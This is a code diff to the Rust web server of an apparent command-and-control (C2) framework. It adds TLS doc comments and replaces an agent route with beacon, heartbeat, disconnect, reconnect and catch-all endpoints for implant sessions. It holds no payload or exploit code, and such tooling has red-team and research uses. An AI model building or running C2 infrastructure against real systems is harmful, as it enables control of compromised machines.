@@ -10,7 +10,7 @@ use rustls::pki_types;
 
 use crate::core::c2::C2;
 use crate::utils::logging::Logging; 
-use crate::communication::handler;
+use crate::communication::http_session;
 
 
 // GET route: health check
@@ -19,6 +19,13 @@ async fn health_check() -> impl Responder {
     HttpResponse::Ok().body("C2 Server is running")
 }
 
+/// Loads TLS certificate and private key from disk and configures a Rustls ServerConfig.
+/// 
+/// Returns:
+/// - Ok(ServerConfig) if successful
+/// - Err(Box<dyn Error>) if certificate or key loading/parsing fails
+///
+/// Expects certificate at `certs/cert.pem` and key at `certs/key.pem`.
 pub fn configure_tls() -> Result<ServerConfig, Box<dyn std::error::Error + Send + Sync>> {
     // to create a self-signed temporary cert for testing:
     // `openssl req -x509 -newkey rsa:4096 -nodes -keyout key.pem -out cert.pem -days 365 -subj '/CN=localhost'`
@@ -68,6 +75,16 @@ pub fn configure_tls() -> Result<ServerConfig, Box<dyn std::error::Error + Send 
 
 }
 
+/// Starts the HTTP or HTTPS Actix server with the given address and C2 state.
+/// 
+/// # Arguments
+/// * `addr` - Address to bind the server to.
+/// * `c2` - Shared C2 state.
+/// * `tls` - If true, starts HTTPS; otherwise, HTTP.
+/// 
+/// # Returns
+/// * `Ok(())` if the server starts successfully.
+/// * `Err` if there is a server or TLS configuration error.
 pub async fn run_server(addr: &str, c2: Arc<Mutex<C2>>, tls: bool) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
     let _bind_address = "0.0.0.0:8080"; // or pull from Args if needed
 
@@ -76,8 +93,13 @@ pub async fn run_server(addr: &str, c2: Arc<Mutex<C2>>, tls: bool) -> Result<(),
 
         HttpServer::new(move || {
             App::new()
-                .app_data(web::Data::from(c2.clone()))
+                .app_data(web::Data::new(c2.clone()))
                 .route("/", web::get().to(health_check))
+                .route("/beacon", web::post().to(http_session::handle_beacon))
+                .route("/heartbeat", web::post().to(http_session::handle_heartbeat))
+                .route("/disconnect", web::post().to(http_session::handle_disconnect))
+                .route("/reconnect", web::post().to(http_session::handle_reconnect))
+                .route("/{tail:.*}", web::get().to(http_session::handle_other))
             })
             .bind_rustls_0_23(addr, configure_tls()?)?// port 8443 or 443 default
             .workers(4)
@@ -88,10 +110,13 @@ pub async fn run_server(addr: &str, c2: Arc<Mutex<C2>>, tls: bool) -> Result<(),
 
         HttpServer::new(move || {
             App::new()
-                .app_data(web::Data::from(c2.clone()))
+                .app_data(web::Data::new(c2.clone()))
                 .route("/", web::get().to(health_check))
-                .route("/agent", web::post().to(handler::handle_agent_message))
-                // You can add more routes here as needed
+                .route("/beacon", web::post().to(http_session::handle_beacon))
+                .route("/heartbeat", web::post().to(http_session::handle_heartbeat))
+                .route("/disconnect", web::post().to(http_session::handle_disconnect))
+                .route("/reconnect", web::post().to(http_session::handle_reconnect))
+                .route("/{tail:.*}", web::get().to(http_session::handle_other))
         })
         .bind(addr)? // port 8080 or 80 default
         .workers(4) // or tune as needed
